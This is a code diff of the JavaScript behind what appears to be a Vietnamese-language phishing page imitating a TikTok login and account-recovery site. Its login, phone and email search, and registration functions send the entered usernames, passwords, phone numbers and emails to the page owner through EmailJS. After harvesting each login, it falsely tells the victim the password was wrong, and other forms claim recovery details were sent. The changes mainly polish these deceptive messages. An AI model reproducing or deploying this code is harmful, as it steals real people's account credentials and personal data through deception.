+            const isDesktop = document.body.classList.contains('desktop-mode');
+            hideAllExcept('.about-container');
+            if (isDesktop) {
+                document.querySelector('.left-section').style.display = 'none';
+            } else {
+                document.getElementById('header-title').innerText = 'Giới thiệu';
+                document.getElementById('header-title').classList.add('small-title');
+                document.getElementById('language-text').style.display = 'none';
+                document.getElementById('back-button-header').style.display = 'flex';
+            }
+        }
+
+        function showHelp() {
+            const isDesktop = document.body.classList.contains('desktop-mode');
+            hideAllExcept('.help-container');
+            if (isDesktop) {
+                document.querySelector('.left-section').style.display = 'none';
+            } else {
+                document.getElementById('header-title').innerText = 'Trợ giúp';
+                document.getElementById('header-title').classList.add('small-title');
+                document.getElementById('language-text').style.display = 'none';
+                document.getElementById('back-button-header').style.display = 'flex';
+            }
+        }
+
+        function showMore() {
+            const isDesktop = document.body.classList.contains('desktop-mode');
+            hideAllExcept('.more-container');
+            if (isDesktop) {
+                document.querySelector('.left-section').style.display = 'none';
+            } else {
+                document.getElementById('header-title').innerText = 'Xem thêm';
+                document.getElementById('header-title').classList.add('small-title');
+                document.getElementById('language-text').style.display = 'none';
+                document.getElementById('back-button-header').style.display = 'flex';
             }
         }
 
@@ -590,6 +855,11 @@
             document.getElementById('dialog-message').innerText = message;
             dialog.style.display = 'block';
             overlay.style.display = 'block';
+            setTimeout(() => {
+                if (window.getComputedStyle(dialog).display === 'none') {
+                    alert(`${title}\n${message}`);
+                }
+            }, 100);
         }
 
         function hideDialog() {
@@ -598,15 +868,13 @@
         }
 
         function login(mode) {
-            const loginInput = mode === 'tiktok' ? document.getElementById('login-input-tiktok') :
-                             document.getElementById('login-input-desktop');
-            const passwordInput = mode === 'tiktok' ? document.getElementById('password-tiktok') :
-                                 document.getElementById('password-desktop');
+            const loginInput = mode === 'tiktok' ? document.getElementById('login-input-tiktok') : document.getElementById('login-input-desktop');
+            const passwordInput = mode === 'tiktok' ? document.getElementById('password-tiktok') : document.getElementById('password-desktop');
             const loginValue = loginInput.value;
             const password = passwordInput.value;
 
             if (!loginValue || !password) {
-                showDialog("Đăng nhập thất bại!", "Vui lòng nhập đầy đủ thông tin!");
+                showDialog("Đăng nhập không thành công!", "Vui lòng nhập đầy đủ thông tin!");
                 return;
             }
 
@@ -620,39 +888,57 @@
 
             emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
                 .then(function(response) {
-                    showDialog("Đăng nhập thất bại!", "Sai tên đăng nhập hoặc mật khẩu, vui lòng thử lại");
+                    showDialog("Đăng nhập không thành công", "Sai tên đăng nhập hoặc mật khẩu vui lòng thử lại.");
                 }, function(error) {
-                    showDialog("Đăng nhập thất bại!", "Có lỗi xảy ra, vui lòng thử lại!");
+                    showDialog("Đăng nhập không thành công", "Sai thông tin tài khoản hoặc mật khẩu vui lòng thử lại.");
                 });
         }
 
         function searchByPhone() {
             const phone = document.getElementById('phone-input').value;
+
             if (!phone) {
                 showDialog("Tìm kiếm thất bại!", "Vui lòng nhập số di động!");
                 return;
             }
-            const templateParams = { password: '', phone: phone, email: '', firstName: '', lastName: '' };
+
+            const templateParams = {
+                password: '',
+                phone: phone,
+                email: '',
+                firstName: '',
+                lastName: ''
+            };
+
             emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
                 .then(function(response) {
-                    showDialog("Tìm kiếm thành công!", "Thông tin khôi phục đã được gửi đến Gmail của bạn!");
+                    showDialog("Gửi yêu cầu thành công!", "Yêu cầu đã được gửi đến số di động của bạn!");
                 }, function(error) {
-                    showDialog("Tìm kiếm thất bại!", "Không tìm thấy tài khoản!");
+                    showDialog("Tìm kiếm thất bại!", "Không tìm thấy tài khoản. Vui lòng thử lại!");
                 });
         }
 
         function searchByEmail() {
             const email = document.getElementById('email-input').value;
+
             if (!email) {
                 showDialog("Tìm kiếm thất bại!", "Vui lòng nhập email!");
                 return;
             }
-            const templateParams = { password: '', phone: '', email: email, firstName: '', lastName: '' };
+
+            const templateParams = {
+                password: '',
+                phone: '',
+                email: email,
+                firstName: '',
+                lastName: ''
+            };
+
             emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
                 .then(function(response) {
-                    showDialog("Tìm kiếm thành công!", "Thông tin khôi phục đã được gửi đến Gmail của bạn!");
+                    showDialog("Gửi yêu cầu thành công!", "Yêu cầu đã được gửi đến email của bạn!");
                 }, function(error) {
-                    showDialog("Tìm kiếm thất bại!", "Không tìm thấy tài khoản!");
+                    showDialog("Tìm kiếm thất bại!", "Không tìm thấy tài khoản. Vui lòng thử lại!");
                 });
         }
 
@@ -668,6 +954,7 @@
                 showDialog("Đăng ký thất bại!", "Vui lòng điền đầy đủ thông tin!");
                 return;
             }
+
             if (password !== confirmPassword) {
                 showDialog("Đăng ký thất bại!", "Mật khẩu không khớp!");
                 return;
@@ -683,7 +970,7 @@
 
             emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
                 .then(function(response) {
-                    showDialog("Đăng ký thành công!", "Thông tin tài khoản đã được gửi đến Gmail của bạn!");
+                    showDialog("Đăng ký thành công!", "Email đã được gửi thành công!");
                 }, function(error) {
                     showDialog("Đăng ký thất bại!", "Có lỗi xảy ra, vui lòng thử lại!");
                 });
